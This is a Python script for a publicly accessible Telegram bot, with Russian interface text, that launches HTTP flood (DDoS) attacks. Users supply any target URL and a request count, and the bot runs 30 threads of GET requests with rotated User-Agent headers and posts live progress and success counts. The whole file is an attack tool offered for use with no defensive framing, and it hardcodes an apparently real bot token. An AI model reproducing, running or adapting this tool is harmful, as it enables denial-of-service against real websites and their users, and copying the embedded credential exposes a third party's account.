# -*- coding: utf-8 -*-
import requests
import threading
import time
import random
import sys

# ======================= КОНФИГУРАЦИЯ =======================
TOKEN = "8257424191:AAEj5QRCY-6jnQ58p6KT7LhkqzUosMnM8aI"
# ============================================================

# Хранилище данных
user_states = {}
active_attacks = {}
attack_lock = threading.Lock()


# ======================= ФУНКЦИИ ДЛЯ TELEGRAM =======================

def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup: data["reply_markup"] = reply_markup
    try:
        response = requests.post(url, json=data, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Send error: {e}")
        return None


def edit_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup: data["reply_markup"] = reply_markup
    try:
        requests.post(url, json=data, timeout=10)
    except:
        pass


def answer_callback(callback_id, text, show_alert=False):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
    try:
        requests.post(url, json=data, timeout=10)
    except:
        pass


def delete_message(chat_id, message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
    data = {"chat_id": chat_id, "message_id": message_id}
    try:
        requests.post(url, json=data, timeout=10)
    except:
        pass


# ======================= КЛАССЫ КЛАВИАТУР =======================

class InlineKeyboardButton:
    def __init__(self, text, callback_data):
        self.text = text
        self.callback_data = callback_data


class InlineKeyboardMarkup:
    def __init__(self):
        self.buttons = []

    def add(self, *buttons):
        row = [{"text": btn.text, "callback_data": btn.callback_data} for btn in buttons]
        self.buttons.append(row)

    def to_dict(self):
        return {"inline_keyboard": self.buttons}


# ======================= КЛАСС АТАКИ =======================

class DDoSAttack:
    def __init__(self, url, count, chat_id, message_id, attack_id):
        self.url = url
        self.count = count
        self.chat_id = chat_id
        self.message_id = message_id
        self.attack_id = attack_id
        self.is_running = True
        self.sent = 0
        self.success = 0
        self.error = 0
        self.start_time = time.time()
        self.threads = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]
        with attack_lock:
            active_attacks[attack_id] = self

    def worker(self):
        while self.is_running and self.sent < self.count:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                r = requests.get(self.url, headers=headers, timeout=2)
                with attack_lock:
                    self.sent += 1
                    if r.status_code == 200:
                        self.success += 1
                    else:
                        self.error += 1
            except:
                with attack_lock:
                    self.sent += 1
                    self.error += 1
            if self.sent % 50 == 0: self.update_status()

    def update_status(self):
        if not self.is_running: return
        elapsed = time.time() - self.start_time
        rate = self.sent / elapsed if elapsed > 0 else 0
        percent = int(self.sent / self.count * 100) if self.count > 0 else 0
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🛑 ОСТАНОВИТЬ АТАКУ", f"stop_{self.attack_id}"))
        text = (f"🔥 <b>DDoS АТАКА</b>\n\n🎯 <b>Цель:</b> {self.url}\n"
                f"📊 <b>Прогресс:</b> {self.sent}/{self.count} ({percent}%)\n"
                f"⚡ <b>Скорость:</b> {rate:.1f}/сек\n✅ <b>Успешно:</b> {self.success}\n"
                f"❌ <b>Ошибок:</b> {self.error}\n⏱ <b>Время:</b> {int(elapsed)} сек")
        edit_message(self.chat_id, self.message_id, text, markup.to_dict())

    def run(self):
        for _ in range(30):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        while self.is_running and self.sent < self.count:
            time.sleep(0.1)
        self.is_running = False
        elapsed = time.time() - self.start_time
        text = f"✅ <b>АТАКА ЗАВЕРШЕНА</b>" if self.sent >= self.count else f"🛑 <b>АТАКА ОСТАНОВЛЕНА</b>"
        text += f"\n\n🎯 <b>Цель:</b> {self.url}\n📊 <b>Отправлено:</b> {self.sent}\n⏱ <b>Время:</b> {int(elapsed)} сек"
        edit_message(self.chat_id, self.message_id, text)
        with attack_lock:
            if self.attack_id in active_attacks: del active_attacks[self.attack_id]

    def stop(self):
        self.is_running = False


# ======================= ОБРАБОТКА ОБНОВЛЕНИЙ =======================

def process_updates():
    offset = 0
    print("🟢 Бот запущен (ОБЩЕСТВЕННЫЙ ДОСТУП)")
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            data = requests.get(url, params={"offset": offset, "timeout": 30}).json()
            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1

                    if "message" in update:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        user_id = msg["from"]["id"]
                        text = msg.get("text", "")

                        if text == "/start":
                            markup = InlineKeyboardMarkup()
                            markup.add(InlineKeyboardButton("⚡ НОВАЯ АТАКА", "new"),
                                       InlineKeyboardButton("📊 СТАТУС", "status"))
                            send_message(chat_id, "🔥 <b>DDoS БОТ</b>\nВыберите действие:", markup.to_dict())

                        elif text == "⚡ НОВАЯ АТАКА" or text == "/ddos":
                            send_message(chat_id, "🌐 Введите URL цели:")
                            user_states[user_id] = {"step": "waiting_url"}

                        elif user_id in user_states:
                            state = user_states[user_id]
                            if state["step"] == "waiting_url":
                                url_target = text.strip()
                                if not url_target.startswith(
                                    ('http://', 'https://')): url_target = 'http://' + url_target
                                state.update({"url": url_target, "step": "waiting_count"})
                                send_message(chat_id, f"🎯 Цель: {url_target}\nВведите кол-во запросов (макс 5000):")
                            elif state["step"] == "waiting_count":
                                try:
                                    count = min(int(text.strip()), 5000)
                                    attack_id = f"atk_{int(time.time())}"
                                    url_fin = state["url"]
                                    del user_states[user_id]
                                    markup = InlineKeyboardMarkup()
                                    markup.add(
                                        InlineKeyboardButton("✅ ЗАПУСТИТЬ", f"start_{attack_id}|{url_fin}|{count}"),
                                        InlineKeyboardButton("❌ ОТМЕНА", "cancel"))
                                    send_message(chat_id, f"⚠️ <b>ЗАПУСК?</b>\n🎯 {url_fin}\n📊 {count} зап.",
                                                 markup.to_dict())
                                except:
                                    send_message(chat_id, "❌ Введите число")

                    elif "callback_query" in update:
                        cb = update["callback_query"];
                        cb_id = cb["id"];
                        chat_id = cb["message"]["chat"]["id"]
                        msg_id = cb["message"]["message_id"];
                        user_id = cb["from"]["id"];
                        data_cb = cb["data"]

                        if data_cb == "new":
                            delete_message(chat_id, msg_id)
                            send_message(chat_id, "🌐 Введите URL цели:")
                            user_states[user_id] = {"step": "waiting_url"}
                        elif data_cb == "status":
                            count_act = len(active_attacks)
                            answer_callback(cb_id, f"Активно: {count_act}")
                            send_message(chat_id, f"📊 <b>Активных атак:</b> {count_act}")
                        elif data_cb == "cancel":
                            delete_message(chat_id, msg_id)
                        elif data_cb.startswith("start_"):
                            _, a_id, a_url, a_count = data_cb.replace('|', '_').split('_')
                            delete_message(chat_id, msg_id)
                            res = send_message(chat_id, "🚀 Подготовка...")
                            if res:
                                atk = DDoSAttack(a_url, int(a_count), chat_id, res["result"]["message_id"], a_id)
                                threading.Thread(target=atk.run, daemon=True).start()
                        elif data_cb.startswith("stop_"):
                            a_id = data_cb.split('_')[1]
                            with attack_lock:
                                if a_id in active_attacks:
                                    active_attacks[a_id].stop()
                                    answer_callback(cb_id, "🛑 Останавливаю...")
        except Exception as e:
            print(f"Error: {e}");
            time.sleep(5)


if __name__ == "__main__":
    process_updates()
